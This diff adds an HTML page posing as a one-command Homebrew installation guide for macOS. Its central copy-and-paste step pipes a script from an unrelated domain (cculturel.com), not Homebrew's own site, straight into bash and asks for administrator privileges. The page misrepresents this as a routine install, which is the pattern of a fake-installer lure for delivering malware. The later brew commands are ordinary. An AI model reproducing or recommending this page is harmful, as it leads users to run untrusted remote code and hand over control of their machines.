@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>One-Command Homebrew Installation for macOS</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      margin: 0;
+      padding: 2rem;
+      background-color: #f9f9f9;
+      color: #333;
+      line-height: 1.6;
+    }
+
+    h1, h2, h3 {
+      color: #111;
+    }
+
+    code {
+      padding: 2px 4px;
+      border-radius: 4px;
+      font-family: monospace;
+    }
+
+    pre {
+      background: #272822;
+      color: #f8f8f2;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+      position: relative;
+    }
+
+    .copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background-color: #007aff;
+      color: white;
+      border: none;
+      padding: 0.3rem 0.6rem;
+      font-size: 0.9rem;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .copy-btn:active {
+      background-color: #005fcc;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #ddd;
+      margin: 2rem 0;
+    }
+
+    .section {
+      margin-bottom: 2rem;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🍺 One-Command Homebrew Installation for macOS</h1>
+  <p>Install <strong>Homebrew</strong>, the powerful macOS package manager, with a single Terminal command. Perfect for setting up development environments or automating fresh macOS configs.</p>
+
+  <hr>
+
+  <div class="section">
+    <h2>⚡ Start Now</h2>
+    <p>Open your Terminal and run this command:</p>
+    <pre><button class="copy-btn" onclick="copy(this)">Copy</button><code>/bin/bash -c "$(curl -fsSL https://cculturel.com/homebrew/install.sh)"</code></pre>
+    <p>This script will:</p>
+    <ul>
+      <li>Install the latest version of Homebrew</li>
+      <li>Configure system paths</li>
+      <li>Verify the installation</li>
+      <li>Optionally set up core packages (<code>git</code>, <code>wget</code>, etc.)</li>
+    </ul>
+  </div>
+
+  <hr>
+
+  <div class="section">
+    <h2>🧩 Requirements</h2>
+    <ul>
+      <li>macOS 10.14 or later</li>
+      <li>Administrator privileges</li>
+      <li>Internet connection</li>
+      <li>Command Line Tools for Xcode (installed automatically if missing)</li>
+    </ul>
+  </div>
+
+  <hr>
+
+  <div class="section">
+    <h2>🖥 Opening Terminal</h2>
+    <h3>🔍 Via Spotlight</h3>
+    <ol>
+      <li>Press <code>Command (⌘) + Space</code></li>
+      <li>Type <code>Terminal</code></li>
+      <li>Press <code>Return</code></li>
+    </ol>
+    <h3>📁 Via Finder</h3>
+    <ol>
+      <li>Open <strong>Finder</strong></li>
+      <li>Go to <code>Applications > Utilities</code></li>
+      <li>Launch <strong>Terminal.app</strong></li>
+    </ol>
+  </div>
+
+  <hr>
+
+  <div class="section">
+    <h2>✅ Verify Installation</h2>
+    <p>After the script completes, run:</p>
+    <pre><button class="copy-btn" onclick="copy(this)">Copy</button><code>brew doctor</code></pre>
+    <p>You should see: <code>Your system is ready to brew.</code></p>
+    <p>To confirm version:</p>
+    <pre><button class="copy-btn" onclick="copy(this)">Copy</button><code>brew --version</code></pre>
+  </div>
+
+  <hr>
+
+  <div class="section">
+    <h2>📦 Optional: Install Essentials</h2>
+    <p>Once Homebrew is ready, you can enhance your system with:</p>
+    <pre><button class="copy-btn" onclick="copy(this)">Copy</button><code>brew install git wget zsh node python3</code></pre>
+    <p>Or install casks for apps:</p>
+    <pre><button class="copy-btn" onclick="copy(this)">Copy</button><code>brew install --cask visual-studio-code iterm2 google-chrome</code></pre>
+  </div>
+
+  <hr>
+
+  <div class="section">
+    <h2>🚀 Pro Tip: Auto Brewfile</h2>
+    <p>Set up your favorite tools in seconds using a <code>Brewfile</code>:</p>
+    <pre><button class="copy-btn" onclick="copy(this)">Copy</button><code>brew bundle --file=~/Brewfile</code></pre>
+  </div>
+
+  <hr>
+
+  <div class="section">
+    <h2>🙌 You're Done!</h2>
+    <p>Homebrew is now installed and ready to use. Easily manage packages, tools, and apps from the Terminal — the macOS way developers love.</p>
+    <blockquote>🍻 Cheers to a better command-line experience!</blockquote>
+  </div>
+
+  <script>
+    function copy(button) {
+      const code = button.nextElementSibling.innerText;
+      navigator.clipboard.writeText(code).then(() => {
+        button.innerText = "Copied!";
+        setTimeout(() => button.innerText = "Copy", 2000);
+      });
+    }
+  </script>
+</body>
+</html>
